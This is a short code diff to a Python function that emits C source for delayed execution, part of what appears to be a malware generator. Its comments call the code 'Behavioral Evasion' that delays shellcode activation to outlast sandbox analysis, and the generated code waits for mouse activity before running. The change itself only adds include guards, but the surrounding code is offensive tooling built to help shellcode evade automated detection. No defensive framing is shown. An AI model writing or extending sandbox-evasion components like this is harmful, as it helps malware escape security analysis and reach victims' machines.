@@ -35,6 +35,9 @@ def generate_delayed_exec() -> Dict[str, Any]:
 // Layer 4 – Behavioral Evasion
 // Delays shellcode activation to outlast automated sandbox analysis windows.
 
+#ifndef PHANTOM_DELAYED_EXEC_INCLUDED
+#define PHANTOM_DELAYED_EXEC_INCLUDED
+
 #include <windows.h>
 #include <stdint.h>
 
@@ -87,6 +90,8 @@ static void perform_delayed_execution(void) {{
     // Finally wait for mouse activity
     wait_for_user_activity(120000);
 }}
+
+#endif /* PHANTOM_DELAYED_EXEC_INCLUDED */
 """
 
     return {
